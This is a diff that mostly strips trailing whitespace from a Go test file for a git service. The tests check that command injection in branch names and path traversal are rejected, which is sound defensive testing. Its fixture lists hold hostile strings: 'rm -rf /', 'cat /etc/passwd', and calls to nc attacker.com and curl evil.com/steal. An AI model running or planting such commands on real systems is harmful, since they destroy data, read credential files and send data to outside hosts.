@@ -14,7 +14,7 @@ import (
 	"github.com/gorilla/mux"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
-	
+
 	"github.com/ferg-cod3s/vibetunnel/go-server/pkg/types"
 )
 
@@ -45,7 +45,7 @@ func setupTestRepo(t *testing.T) (string, func()) {
 	// Configure user for testing
 	err = runGitCommand(tempDir, "config", "user.email", "test@example.com")
 	require.NoError(t, err)
-	
+
 	err = runGitCommand(tempDir, "config", "user.name", "Test User")
 	require.NoError(t, err)
 
@@ -78,7 +78,7 @@ func TestGitService_CommandInjectionPrevention(t *testing.T) {
 	maliciousBranches := []string{
 		"; rm -rf /",
 		"master && rm important.txt",
-		"branch`evil_command`", 
+		"branch`evil_command`",
 		"test; cat /etc/passwd",
 		"main|nc attacker.com 4444",
 		"feature && curl evil.com/steal",
@@ -92,7 +92,7 @@ func TestGitService_CommandInjectionPrevention(t *testing.T) {
 	for _, maliciousBranch := range maliciousBranches {
 		t.Run("checkout_blocks_injection_"+maliciousBranch, func(t *testing.T) {
 			err := service.CheckoutBranch(maliciousBranch)
-			
+
 			// Should ALWAYS fail with validation error, never execute the command
 			require.Error(t, err)
 			assert.Contains(t, err.Error(), "invalid")
@@ -100,8 +100,8 @@ func TestGitService_CommandInjectionPrevention(t *testing.T) {
 
 		t.Run("create_branch_blocks_injection_"+maliciousBranch, func(t *testing.T) {
 			err := service.CreateBranch(maliciousBranch)
-			
-			require.Error(t, err) 
+
+			require.Error(t, err)
 			assert.Contains(t, err.Error(), "invalid")
 		})
 	}
@@ -129,13 +129,13 @@ func TestGitService_PathTraversalPrevention(t *testing.T) {
 	for _, maliciousPath := range maliciousPaths {
 		t.Run("discover_blocks_traversal_"+maliciousPath, func(t *testing.T) {
 			repos, err := service.DiscoverRepositories(maliciousPath)
-			
+
 			// Should either error or return empty results, never access outside base path
 			if err != nil {
 				// Should get access denied or invalid path error
-				assert.True(t, 
-					strings.Contains(err.Error(), "invalid") || 
-					strings.Contains(err.Error(), "access denied"),
+				assert.True(t,
+					strings.Contains(err.Error(), "invalid") ||
+						strings.Contains(err.Error(), "access denied"),
 					"Expected 'invalid' or 'access denied' error, got: %s", err.Error())
 			} else {
 				assert.Empty(t, repos)
@@ -167,7 +167,7 @@ func TestGitService_InputValidation(t *testing.T) {
 		{
 			name:        "valid_branch_name_with_numbers",
 			input:       "hotfix-123",
-			operation:   "checkout", 
+			operation:   "checkout",
 			expectError: false,
 		},
 		{
@@ -194,7 +194,7 @@ func TestGitService_InputValidation(t *testing.T) {
 		{
 			name:        "contains_pipe",
 			input:       "test|branch",
-			operation:   "checkout", 
+			operation:   "checkout",
 			expectError: true,
 			errorMsg:    "invalid",
 		},
@@ -231,7 +231,7 @@ func TestGitService_InputValidation(t *testing.T) {
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
 			var err error
-			
+
 			switch tt.operation {
 			case "checkout":
 				err = service.CheckoutBranch(tt.input)
@@ -263,9 +263,9 @@ func TestGitService_RepositoryAccessControl(t *testing.T) {
 
 	// Test accessing repository outside of allowed base path
 	outsideRepo := "/tmp/outside_repo"
-	
+
 	status, err := service.GetRepositoryStatus(outsideRepo)
-	
+
 	// Should fail with access denied
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "access denied")
@@ -280,10 +280,10 @@ func TestGitService_GetRepositoryStatus(t *testing.T) {
 	service := NewGitService(repoPath, newMockEventBroadcaster())
 
 	status, err := service.GetRepositoryStatus(".")
-	
+
 	require.NoError(t, err)
 	require.NotNil(t, status)
-	
+
 	assert.Equal(t, repoPath, status.RepoPath)
 	assert.Equal(t, "master", status.CurrentBranch) // Git default branch
 	assert.True(t, status.IsClean)
@@ -302,25 +302,25 @@ func TestGitService_ListBranches(t *testing.T) {
 	// Create additional test branch
 	err := runGitCommand(repoPath, "checkout", "-b", "test-branch")
 	require.NoError(t, err)
-	
+
 	// Switch back to master
 	err = runGitCommand(repoPath, "checkout", "master")
 	require.NoError(t, err)
 
 	branches, err := service.ListBranches()
-	
+
 	require.NoError(t, err)
 	require.Len(t, branches, 2)
-	
+
 	// Should contain both branches
 	branchNames := make([]string, len(branches))
 	for i, branch := range branches {
 		branchNames[i] = branch.Name
 	}
-	
+
 	assert.Contains(t, branchNames, "master")
 	assert.Contains(t, branchNames, "test-branch")
-	
+
 	// Master should be current
 	for _, branch := range branches {
 		if branch.Name == "master" {
@@ -341,7 +341,7 @@ func TestGitService_InvalidRepository(t *testing.T) {
 	service := NewGitService(tempDir, newMockEventBroadcaster())
 
 	status, err := service.GetRepositoryStatus(".")
-	
+
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "not a git repository")
 	assert.Nil(t, status)
@@ -363,11 +363,11 @@ func TestGitAPIHandler_GetStatus(t *testing.T) {
 	router.ServeHTTP(rr, req)
 
 	assert.Equal(t, http.StatusOK, rr.Code)
-	
+
 	var status RepositoryStatus
 	err = json.Unmarshal(rr.Body.Bytes(), &status)
 	require.NoError(t, err)
-	
+
 	assert.Equal(t, repoPath, status.RepoPath)
 	assert.Equal(t, "master", status.CurrentBranch)
 	assert.True(t, status.IsClean)
@@ -389,11 +389,11 @@ func TestGitAPIHandler_ListBranches(t *testing.T) {
 	router.ServeHTTP(rr, req)
 
 	assert.Equal(t, http.StatusOK, rr.Code)
-	
+
 	var response BranchListResponse
 	err = json.Unmarshal(rr.Body.Bytes(), &response)
 	require.NoError(t, err)
-	
+
 	assert.NotEmpty(t, response.Branches)
 	assert.Contains(t, response.Branches[0].Name, "master")
 }
@@ -415,7 +415,7 @@ func TestGitAPIHandler_SecurityValidation(t *testing.T) {
 	}{
 		{
 			name:     "path_traversal_in_status",
-			method:   "GET", 
+			method:   "GET",
 			url:      "/api/git/status?path=../../../etc/passwd",
 			expected: http.StatusBadRequest,
 		},
@@ -431,7 +431,7 @@ func TestGitAPIHandler_SecurityValidation(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			var req *http.Request
 			var err error
-			
+
 			if tt.method == "POST" {
 				body := strings.NewReader(`{"branch": "; rm -rf /"}`)
 				req, err = http.NewRequest(tt.method, tt.url, body)
@@ -439,7 +439,7 @@ func TestGitAPIHandler_SecurityValidation(t *testing.T) {
 			} else {
 				req, err = http.NewRequest(tt.method, tt.url, nil)
 			}
-			
+
 			require.NoError(t, err)
 
 			rr := httptest.NewRecorder()
@@ -459,30 +459,30 @@ func TestGitService_DiscoverRepositories(t *testing.T) {
 	// Create a few git repositories
 	repo1 := filepath.Join(baseDir, "repo1")
 	repo2 := filepath.Join(baseDir, "subdir", "repo2")
-	
+
 	os.MkdirAll(repo1, 0755)
 	os.MkdirAll(repo2, 0755)
-	
+
 	// Initialize repos
 	err = runGitCommand(repo1, "init")
 	require.NoError(t, err)
-	
+
 	err = runGitCommand(repo2, "init")
 	require.NoError(t, err)
 
 	service := NewGitService(baseDir, newMockEventBroadcaster())
 
 	repos, err := service.DiscoverRepositories(".")
-	
+
 	require.NoError(t, err)
 	assert.Len(t, repos, 2)
-	
+
 	// Should find both repositories
 	repoPaths := make([]string, len(repos))
 	for i, repo := range repos {
 		repoPaths[i] = repo.Path
 	}
-	
+
 	assert.Contains(t, repoPaths, repo1)
 	assert.Contains(t, repoPaths, repo2)
 }
@@ -491,12 +491,12 @@ func TestGitService_DiscoverRepositories(t *testing.T) {
 func runGitCommand(repoPath string, args ...string) error {
 	cmd := exec.Command("git", args...)
 	cmd.Dir = repoPath
-	
+
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		return fmt.Errorf("git command failed: %v (output: %s)", err, string(output))
 	}
-	
+
 	return nil
 }
 
@@ -521,7 +521,7 @@ func TestGitService_PerformanceLargeRepo(t *testing.T) {
 
 	// Test that status still responds quickly
 	status, err := service.GetRepositoryStatus(".")
-	
+
 	require.NoError(t, err)
 	assert.NotNil(t, status)
 	assert.Len(t, status.UntrackedFiles, 100)
